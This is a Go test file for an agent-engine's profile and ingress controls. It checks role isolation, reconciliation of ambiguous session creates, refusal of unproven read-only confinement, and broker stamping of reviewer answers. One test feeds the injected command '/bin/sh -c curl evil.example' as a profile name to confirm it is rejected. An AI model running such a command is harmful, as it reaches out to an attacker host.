package control

// S2 profile and ingress tests.
//
// The claim under test has two halves that pull in opposite directions, and both
// matter:
//
//   - A named profile must be enough to launch a real, independent context, with
//     the session bound before it starts and an ambiguous create reconciled
//     rather than duplicated.
//   - A profile that declares a write restriction must be REFUSED unless that
//     restriction has been demonstrated. The second half is the one that is easy
//     to fake and expensive to get wrong, so it is tested as hard as the first.

import (
	"context"
	"errors"
	"fmt"
	"strings"
	"testing"
	"time"

	"github.com/emjin/agent-engine/internal/agentdeck"
)

// profileFixture installs a small operator-approved registry on a fixture.
func profileFixture(t *testing.T) *fixture {
	t.Helper()
	f := boundRequest(t, newFixture(t))
	f.cfg.Profiles = map[string]Profile{
		"impl":  {Name: "impl", Role: RoleWorker, Tool: "mcode", Model: "m", Effort: "high"},
		"audit": {Name: "audit", Role: RoleReviewer, Tool: "mcode"},
		"diag":  {Name: "diag", Role: RoleDiagnostic, Tool: "mcode"},
		"readonly": {
			Name: "readonly", Role: RoleInvestigat, Tool: "mcode",
			ReadOnly: true, Sandbox: true,
			// Proven is deliberately FALSE: the pinned runtime has no read-only
			// seam, so nothing may assert it yet.
			Proven: false,
		},
	}
	return f
}

func profileEngine(t *testing.T, f *fixture, rt *fakeRuntime) *Engine {
	t.Helper()
	eng, err := NewEngine(f.store, rt, "forge-run-1842-repair", EngineOptions{
		Now: func() time.Time { return f.now },
		Log: func(line string) { t.Log(line) },
	})
	if err != nil {
		t.Fatalf("new engine: %v", err)
	}
	t.Cleanup(eng.Close)
	return eng
}

// TestProfiles_CallerDoesNotSelectBackend asserts a caller references names only.
//
// The dangerous shape is a caller supplying a command. It is refused here, and it
// is also true that no code path in this layer can turn a caller's text into an
// executable, because the argv comes from the resolved profile and nowhere else.
func TestProfiles_CallerDoesNotSelectBackend(t *testing.T) {
	f := profileFixture(t)

	// An unknown name is refused with a message that says what is allowed.
	if _, err := f.cfg.ResolveProfile("/bin/sh -c curl evil.example", RoleWorker); !errors.Is(err, ErrUnknownProfile) {
		t.Errorf("a caller-supplied command was accepted as a profile: %v", err)
	}
	// A known name used for the wrong role is refused, which is how a reviewer
	// profile would otherwise end up being the implementer.
	if _, err := f.cfg.ResolveProfile("audit", RoleWorker); !errors.Is(err, ErrRoleMismatch) {
		t.Errorf("a reviewer profile was accepted as a worker: %v", err)
	}
	// The resolved argv comes wholly from the operator's profile.
	p, err := f.cfg.ResolveProfile("impl", RoleWorker)
	if err != nil {
		t.Fatalf("resolve: %v", err)
	}
	args := p.CreateArgs("/approved/worktree")
	joined := strings.Join(args, " ")
	for _, want := range []string{"-c mcode", "--model m", "--effort high"} {
		if !strings.Contains(joined, want) {
			t.Errorf("resolved argv %q does not carry the operator's %q", joined, want)
		}
	}
	if strings.Contains(joined, "evil") {
		t.Errorf("caller text reached the argv: %q", joined)
	}
}

// TestProfiles_SameCliFreshReviewerAllowed asserts the same CLI in two separate
// fresh sessions IS supported.
//
// Independence is about the session and its context, not about which vendor binary
// is running. Refusing a shared CLI would be refusing a working configuration
// rather than enforcing a real property.
func TestProfiles_SameCliFreshReviewerAllowed(t *testing.T) {
	f := profileFixture(t)
	if err := f.cfg.CheckProfileIsolation("impl", "audit"); err != nil {
		t.Fatalf("the same CLI in two fresh profiles was refused: %v", err)
	}
	w, _ := f.cfg.ResolveProfile("impl", RoleWorker)
	r, _ := f.cfg.ResolveProfile("audit", RoleReviewer)
	if w.Tool != r.Tool {
		t.Fatalf("the fixture does not actually share a CLI: %q vs %q", w.Tool, r.Tool)
	}
}

// TestProfiles_ImplementationLineageCannotReview asserts a session that did the
// work can never be bound as its reviewer, even if state says it should be.
func TestProfiles_ImplementationLineageCannotReview(t *testing.T) {
	f := profileFixture(t)
	rt := newFakeRuntime()
	rt.sendState = "landed"
	// The runtime will hand back a session that is already the worker, so the
	// lineage check is what must catch it.
	rt.nextID = "sess-worker-1"
	eng := profileEngine(t, f, rt)

	_, err := eng.LaunchProfile(context.Background(), "forge-run-1842-repair",
		RoleReviewer, "audit", f.srcRoot, "n1")
	if err == nil {
		t.Fatal("a session inside the implementation lineage was bound as the reviewer")
	}
	if !errors.Is(err, ErrProfileNotIsolated) {
		t.Errorf("refusal = %v, want ErrProfileNotIsolated", err)
	}
	// The auditor role must remain unassigned.
	st, serr := f.store.State("forge-run-1842-repair")
	if serr != nil {
		t.Fatalf("state: %v", serr)
	}
	if st.AuditorSession == "sess-impl-1" {
		t.Error("the implementer was bound as the auditor despite the refusal")
	}
}

// TestProfiles_CreateCrashReconcilesOneSession asserts an ambiguous create adopts
// the existing session instead of creating a second one.
func TestProfiles_CreateCrashReconcilesOneSession(t *testing.T) {
	f := profileFixture(t)
	rt := newFakeRuntime()
	rt.sendState = "landed"
	// The label the engine will derive for this request/role/generation/nonce.
	label := ActivationLabel("forge-run-1842-repair", f.taskID(), string(RoleWorker), 1, "n7")
	// The session already exists — a previous attempt created it and died before
	// confirming.
	rt.createdIDs = []string{"sess-previous"}
	rt.sessions = map[string]string{label: "sess-previous"}
	eng := profileEngine(t, f, rt)

	res, err := eng.LaunchProfile(context.Background(), "forge-run-1842-repair",
		RoleWorker, "impl", f.srcRoot, "n7")
	if err != nil {
		t.Fatalf("reconciling an ambiguous create failed: %v", err)
	}
	if !res.Reconciled {
		t.Error("the existing session was not reconciled")
	}
	if res.Created {
		t.Error("a second session was created for an already-satisfied activation")
	}
	if res.SessionID != "sess-previous" {
		t.Errorf("bound session = %q, want the existing one", res.SessionID)
	}

}

// TestProfiles_UninventoryableRuntimeRefusesToCreate asserts a runtime that cannot
// be listed cannot safely create at all.
//
// This is a separate case from reconciliation because it is a different failure:
// an inventory that cannot be read is not an empty inventory. Treating them the
// same is how an ambiguous create turns into a duplicate worker.
func TestProfiles_UninventoryableRuntimeRefusesToCreate(t *testing.T) {
	f := profileFixture(t)
	blind := newFakeRuntime()
	blind.noInventory = true
	eng := profileEngine(t, f, blind)

	_, err := eng.LaunchProfile(context.Background(), "forge-run-1842-repair",
		RoleWorker, "impl", f.srcRoot, "n1")
	if err == nil {
		t.Fatal("a runtime with no session inventory created a session; an ambiguous create cannot be reconciled")
	}
	if !strings.Contains(err.Error(), "inventory") {
		t.Errorf("the refusal did not name the inventory as the reason: %v", err)
	}
	if len(blind.createdIDs) != 0 {
		t.Errorf("the uninventoryable runtime was actually invoked to create: %v", blind.createdIDs)
	}
	// The intent stays in the ledger with its reason, rather than being dropped.
	// It is BLOCKED rather than unresolved: the inventory read failed for a known
	// reason, which is a definite outcome rather than an ambiguity to reconcile.
	st, serr := f.store.State("forge-run-1842-repair")
	if serr != nil {
		t.Fatalf("state: %v", serr)
	}
	if len(st.Activations) != 1 {
		t.Fatalf("activations = %d, want the refused intent retained", len(st.Activations))
	}
	if st.Activations[0].Status != ActivationBlocked {
		t.Errorf("activation status = %q, want %q", st.Activations[0].Status, ActivationBlocked)
	}
	if st.Activations[0].LastError == "" {
		t.Error("the blocked activation carries no reason, so the failure would be invisible")
	}
	// And no worker was bound, so nothing was granted.
	if st.WorkerSession != "sess-worker-1" {
		t.Errorf("worker session = %q, want the pre-bound one unchanged", st.WorkerSession)
	}
}

// TestProfiles_UnprovenConfinementIsRefused asserts a read-only profile cannot be
// launched on the strength of declaring itself read-only.
//
// This is the test that encodes the stage's central finding: the pinned runtime
// mounts the project read-write with no read-only option, so there is nothing to
// prove yet, and a profile must therefore be refused rather than trusted.
func TestProfiles_UnprovenConfinementIsRefused(t *testing.T) {
	f := profileFixture(t)
	rt := newFakeRuntime()
	eng := profileEngine(t, f, rt)

	_, err := eng.LaunchProfile(context.Background(), "forge-run-1842-repair",
		RoleInvestigat, "readonly", f.srcRoot, "n1")
	if !errors.Is(err, ErrConfinementUnproven) {
		t.Fatalf("a read-only profile with unproven confinement was not refused: %v", err)
	}
	if !strings.Contains(err.Error(), "prompt, not a boundary") {
		t.Errorf("the refusal did not say why: %v", err)
	}
	// Nothing may have been created.
	if len(rt.createdIDs) != 0 {
		t.Errorf("an unproven profile was actually launched: %v", rt.createdIDs)
	}

	// Once an operator records the demonstration, the same profile resolves — the
	// gate is about evidence, not about a permanent ban.
	f.cfg.Profiles["readonly"] = Profile{
		Name: "readonly", Role: RoleInvestigat, Tool: "mcode",
		ReadOnly: true, Sandbox: true, Proven: true,
	}
	if _, err := f.cfg.ResolveProfile("readonly", RoleInvestigat); err != nil {
		t.Errorf("a profile with recorded demonstration was still refused: %v", err)
	}
}

// TestIngress_EngineStampsAnsweringSession asserts the broker, not the caller,
// establishes who answered.
//
// The submitted envelope may say anything; the SourceSession that reaches state
// is the session the engine actually queried.
func TestIngress_EngineStampsAnsweringSession(t *testing.T) {
	f := profileFixture(t)
	reviewID := auditedRequest(t, f)
	st, _ := f.store.State("forge-run-1842-repair")
	nonce := st.ActiveReview.AnswerNonce

	rt := newFakeRuntime()
	// The reviewer has answered, naming somebody else in its own text.
	rt.outputs["sess-auditor-1"] = fmt.Sprintf(
		`{"outcome":"FAIL","source_session":"sess-worker-1","report_body":"the fix is wrong","report_sha256":%q}`,
		strings.Repeat("d", 64))
	correlated := testReviewResponse(st, OutcomeFail, "the fix is wrong")
	rt.outputs["sess-auditor-1"] = strings.TrimSuffix(correlated, "}") + `,"source_session":"sess-worker-1"}`
	eng := profileEngine(t, f, rt)

	ans, err := eng.CollectReviewerAnswer(context.Background(), "forge-run-1842-repair", 0)
	if err != nil {
		t.Fatalf("collect: %v", err)
	}
	if ans.SourceSession != "sess-auditor-1" {
		t.Errorf("stamped source = %q, want the session the engine queried", ans.SourceSession)
	}
	if ans.AnswerNonce != nonce {
		t.Errorf("stamped nonce = %q, want the issued %q", ans.AnswerNonce, nonce)
	}
	if ans.ReviewID != reviewID {
		t.Errorf("stamped review = %q, want the open %q", ans.ReviewID, reviewID)
	}
	if !ans.Trusted {
		t.Error("a broker-collected answer is not marked trusted")
	}
	if ans.Outcome != OutcomeFail {
		t.Errorf("outcome = %q, want the reviewer's FAIL", ans.Outcome)
	}
}

// TestIngress_SilentReviewerIsNotAVerdict asserts an unanswered review stays owed.
func TestIngress_UnreadableReviewerIsNotAVerdict(t *testing.T) {
	f := profileFixture(t)
	auditedRequest(t, f)

	rt := newFakeRuntime()
	// The reviewer has produced nothing.
	eng := profileEngine(t, f, rt)
	_, err := eng.CollectReviewerAnswer(context.Background(), "forge-run-1842-repair", 0)
	if !errors.Is(err, ErrReviewerUnreadable) {
		t.Fatalf("an unreadable reviewer did not remain untrusted: %v", err)
	}
	st, serr := f.store.State("forge-run-1842-repair")
	if serr != nil {
		t.Fatalf("state: %v", serr)
	}
	if st.ActiveReview == nil {
		t.Fatal("a silent reviewer closed the review")
	}
	if st.Stage.Terminal() {
		t.Errorf("a silent reviewer made the request terminal as %s", st.Stage)
	}
}

// TestIngress_ProseIsNotAnApproval asserts unparseable output yields no verdict.
func TestIngress_ProseIsNotAnApproval(t *testing.T) {
	f := profileFixture(t)
	auditedRequest(t, f)

	rt := newFakeRuntime()
	rt.outputs["sess-auditor-1"] = "Looks good to me, everything seems fine overall."
	eng := profileEngine(t, f, rt)
	_, err := eng.CollectReviewerAnswer(context.Background(), "forge-run-1842-repair", 0)
	if err == nil {
		t.Fatal("a paragraph of prose was accepted as a typed verdict")
	}
	if errors.Is(err, ErrReviewerSilent) {
		t.Errorf("unparseable output was misreported as silence: %v", err)
	}
}

// TestProfiles_ActivationBindsBeforeStart asserts the full ID is committed before
// the process starts, so a crash after Start cannot orphan a running session.
func TestProfiles_ActivationBindsBeforeStart(t *testing.T) {
	f := profileFixture(t)
	rt := newFakeRuntime()
	rt.sendState = "landed"
	eng := profileEngine(t, f, rt)

	res, err := eng.LaunchProfile(context.Background(), "forge-run-1842-repair",
		RoleWorker, "impl", f.srcRoot, "n1")
	if err != nil {
		t.Fatalf("launch: %v", err)
	}
	if !res.Started {
		t.Fatal("the session was not started")
	}
	st, serr := f.store.State("forge-run-1842-repair")
	if serr != nil {
		t.Fatalf("state: %v", serr)
	}
	if st.WorkerSession != res.SessionID {
		t.Errorf("bound worker = %q, want the confirmed %q", st.WorkerSession, res.SessionID)
	}
	// The activation is CONFIRMED, not left pending.
	var confirmed bool
	for _, a := range st.Activations {
		if a.ActivationID == "AC-"+res.Label {
			if a.Status != ActivationConfirmed {
				t.Errorf("activation status = %q, want %q", a.Status, ActivationConfirmed)
			}
			if a.SessionID != res.SessionID {
				t.Errorf("activation session = %q, want %q", a.SessionID, res.SessionID)
			}
			confirmed = true
		}
	}
	if !confirmed {
		t.Error("no activation record was written for the launch")
	}
	// The profile identity is pinned, not just named.
	if len(st.PinnedProfiles) == 0 || st.PinnedProfiles[0].Name != "impl" {
		t.Errorf("the profile identity was not pinned into state: %+v", st.PinnedProfiles)
	}
	if st.PinnedProfiles[0].Effort != "high" {
		t.Errorf("pinned profile lost its operator settings: %+v", st.PinnedProfiles[0])
	}
	// The session joined the implementation lineage.
	if !st.IsImplementationSession(res.SessionID) {
		t.Error("the launched worker was not recorded in the implementation lineage")
	}
}

// TestProfiles_ActivationLabelIsDeterministic asserts the label is derived, not
// random, because it is the only handle an ambiguous create has.
func TestProfiles_ActivationLabelIsDeterministic(t *testing.T) {
	a := ActivationLabel("root-1", "T-abc", "worker", 2, "nonce")
	b := ActivationLabel("root-1", "T-abc", "worker", 2, "nonce")
	if a != b {
		t.Errorf("the activation label is not deterministic: %q vs %q", a, b)
	}
	// Every distinguishing input must change it.
	for _, other := range []string{
		ActivationLabel("root-2", "T-abc", "worker", 2, "nonce"),
		ActivationLabel("root-1", "T-xyz", "worker", 2, "nonce"),
		ActivationLabel("root-1", "T-abc", "reviewer", 2, "nonce"),
		ActivationLabel("root-1", "T-abc", "worker", 3, "nonce"),
		ActivationLabel("root-1", "T-abc", "worker", 2, "other"),
	} {
		if other == a {
			t.Error("two different activations produced the same label")
		}
	}
	// A title becomes a tmux name, so it must be sanitised.
	dirty := ActivationLabel("root/1", "T:abc def", "worker", 1, "n")
	if strings.ContainsAny(dirty, " /:") {
		t.Errorf("the activation label contains unsafe characters: %q", dirty)
	}
}

// taskID reads the request's stable task identity.
func (f *fixture) taskID() string {
	st, err := f.store.State("forge-run-1842-repair")
	if err != nil {
		return ""
	}
	return st.TaskID
}

// inventoryRuntime is a fake that also supports List, for reconciliation tests.
var _ SessionInventory = (*fakeRuntime)(nil)

// Compile-time assurance that the production runtime satisfies the inventory
// capability the reconciliation path depends on.
var _ SessionInventory = (*agentdeck.CLIRuntime)(nil)

// A rename must recover the original ambiguous create, retaining both durable
// identities rather than deriving another process title from the current brand.
func TestProfiles_RenameReusesRecordedActivationIdentity(t *testing.T) {
	f := profileFixture(t)
	rt := newFakeRuntime()
	rt.sendState = "landed"
	current := ActivationLabel("forge-run-1842-repair", f.taskID(), string(RoleWorker), 1, "rename")
	recorded := "previous-brand" + strings.TrimPrefix(current, "agentengine")
	_, err := f.store.UpdateCommitted("forge-run-1842-repair", func(st *State) error {
		return st.RecordActivation(Activation{ActivationID: "recorded-intent", Role: string(RoleWorker), Label: recorded, Status: ActivationPending})
	})
	if err != nil {
		t.Fatal(err)
	}
	rt.createdIDs = []string{"sess-before-rename"}
	rt.sessions = map[string]string{recorded: "sess-before-rename"}
	eng := profileEngine(t, f, rt)
	res, err := eng.LaunchProfile(context.Background(), "forge-run-1842-repair", RoleWorker, "impl", f.srcRoot, "rename")
	if err != nil {
		t.Fatal(err)
	}
	if !res.Reconciled || res.Created || res.Label != recorded || res.SessionID != "sess-before-rename" {
		t.Fatalf("original activation was not recovered: %+v", res)
	}
	st, err := f.store.State("forge-run-1842-repair")
	if err != nil {
		t.Fatal(err)
	}
	if len(st.Activations) != 1 || st.Activations[0].ActivationID != "recorded-intent" || st.Activations[0].Status != ActivationConfirmed {
		t.Fatalf("activation ledger changed identity: %+v", st.Activations)
	}
}
